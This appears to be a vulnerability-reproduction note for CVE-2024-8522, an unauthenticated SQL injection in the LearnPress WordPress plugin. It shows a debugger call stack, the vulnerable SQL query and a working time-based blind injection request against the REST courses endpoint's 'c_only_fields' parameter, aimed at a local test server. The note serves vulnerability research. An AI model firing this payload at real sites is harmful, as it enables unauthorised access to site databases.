# CVE-2024-8522
LearnPress – WordPress LMS Plugin &lt;= 4.2.7 - Unauthenticated SQL Injection via 'c_only_fields'

## Stack

```txt
class-lp-db.php:702, LP_Database->execute()
class-lp-course-db.php:564, LP_Course_DB->get_courses()
Courses.php:241, LearnPress\Models\Courses::get_courses()
class-lp-rest-courses-v1-controller.php:502, LP_Jwt_Courses_V1_Controller->get_courses()
class-wp-rest-server.php:1230, WP_REST_Server->respond_to_request()
class-wp-rest-server.php:1063, WP_REST_Server->dispatch()
class-wp-rest-server.php:439, WP_REST_Server->serve_request()
rest-api.php:420, rest_api_loaded()
class-wp-hook.php:324, WP_Hook->apply_filters()
class-wp-hook.php:348, WP_Hook->do_action()
plugin.php:565, do_action_ref_array()
class-wp.php:418, WP->parse_request()
class-wp.php:813, WP->main()
functions.php:1336, wp()
wp-blog-header.php:16, require()
index.php:17, {main}()
```


## <>

```txt
SELECT <> FROM wp_posts AS p WHERE 1=1 AND p.post_type = 'lp_course' AND p.post_status IN ('publish') ORDER BY post_date DESC LIMIT 0, 10
```


## PoC

```http
GET /wp-json/learnpress/v1/courses?c_only_fields=IF(COUNT(*)!=-2,(SLEEP(10)),0) HTTP/1.1
Host: localhost:8077
User-Agent: curl/7.81.0
Cookie: XDEBUG_SESSION=PHPSTORM
Accept: */*
```
